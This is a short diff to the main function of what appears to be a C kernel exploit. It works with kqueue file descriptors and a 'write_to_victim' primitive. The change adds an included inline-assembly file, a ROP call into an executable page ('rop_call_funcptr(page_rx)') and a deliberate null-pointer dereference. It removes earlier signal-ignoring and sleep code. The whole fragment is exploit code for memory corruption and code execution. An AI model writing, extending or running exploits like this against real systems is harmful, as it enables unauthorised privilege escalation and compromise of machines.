@@ -525,21 +525,14 @@ int main()
     write_to_victim(&o, 0);
     for(int i = 0; i < 256; i++)
         close(kq[i]);
+#include "inline_asm_2.c"
     if(!fork())
     {
-        struct sigaction ignore = {
-            .sa_handler = SIG_IGN,
-            .sa_mask = 0,
-            .sa_flags = 0
-        };
-        sigaction(SIGTERM, &ignore);
-        sigaction(SIGKILL, &ignore);
+        rop_call_funcptr(page_rx);
         for(int i = 0; i < 4096; i++)
             if(!not_close[i])
-                if(!close(i))
-                    printf("closed fd %d\n", i);
-        for(;;)
-            nanosleep("\xe8\x03\0\0\0\0\0\0\0\0\0\0\0\0\0\0", NULL);
+                close(i);
+        *(volatile void**)0;
     }
     return 0;
 }
